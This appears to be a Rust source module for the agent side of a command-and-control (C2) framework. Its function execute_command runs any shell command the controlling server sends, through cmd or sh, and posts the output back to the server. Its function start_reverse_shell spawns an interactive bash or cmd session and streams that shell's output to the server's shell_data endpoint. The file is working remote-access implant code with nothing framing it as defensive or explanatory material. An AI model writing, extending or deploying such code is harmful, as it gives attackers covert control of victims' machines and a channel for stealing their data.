use reqwest::Client;
use std::process::Stdio;
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::process::Command;

use common::error::{C2Error, C2Result};
use common::message::{CommandRequest, CommandResponse, Message, MessageType, ShellData};

pub async fn execute_command(
    http_client: &Client,
    server_url: &str,
    client_id: &str,
    cmd: CommandRequest,
) -> C2Result<()> {
    println!("Executing command: {}", cmd.command);

    if cmd.command == "REVERSE_SHELL" {
        if let Some(session_id) = cmd.args.first() {
            return start_reverse_shell(http_client, server_url, session_id.clone().to_string())
                .await;
        } else {
            return Err(C2Error::Other(
                "Reverse shell command missing session_id".into(),
            ));
        }
    }

    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(["/C", &cmd.command])
            .args(&cmd.args)
            .output()
            .await?
    } else {
        Command::new("sh")
            .arg("-c")
            .arg(format!("{} {}", cmd.command, cmd.args.join(" ")))
            .output()
            .await?
    };

    let result = CommandResponse {
        client_id: client_id.to_string(),
        command: cmd.command.clone(),
        stdout: String::from_utf8_lossy(&output.stdout).to_string(),
        stderr: String::from_utf8_lossy(&output.stderr).to_string(),
        exit_code: output.status.code().unwrap_or(-1),
        executed_at: chrono::Utc::now(),
    };

    send_command_result(http_client, server_url, result).await
}

async fn send_command_result(
    http_client: &Client,
    server_url: &str,
    result: CommandResponse,
) -> C2Result<()> {
    let payload = serde_json::to_vec(&result)?;
    let message = Message::new(MessageType::CommandResult, payload);

    http_client
        .post(format!("{server_url}/api/command_result"))
        .json(&message)
        .send()
        .await?;
    Ok(())
}

async fn start_reverse_shell(
    http_client: &Client,
    server_url: &str,
    session_id: String,
) -> C2Result<()> {
    println!("Starting reverse shell for session {session_id}...");
    let mut shell_process = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()?
    } else {
        Command::new("/bin/bash")
            .arg("-i")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()?
    };

    let stdout = shell_process
        .stdout
        .take()
        .ok_or(C2Error::Other("Failed to get stdout".into()))?;

    let http_client_clone = http_client.clone();
    let server_url_clone = server_url.to_string();

    tokio::spawn(async move {
        let mut reader = BufReader::new(stdout);
        loop {
            let mut buf = Vec::new();
            match reader.read_until(b'\n', &mut buf).await {
                Ok(0) => break, // EOF
                Ok(_) => {
                    let shell_data = ShellData::new(session_id.clone(), buf);
                    let payload = serde_json::to_vec(&shell_data).unwrap();
                    let message = Message::new(MessageType::ShellData, payload);

                    if let Err(e) = http_client_clone
                        .post(format!("{server_url_clone}/api/shell_data"))
                        .json(&message)
                        .send()
                        .await
                    {
                        eprintln!("Failed to send shell data: {e}");
                    }
                }
                Err(e) => {
                    eprintln!("Error reading from shell stdout: {e}");
                    break;
                }
            }
        }
    });

    Ok(())
}
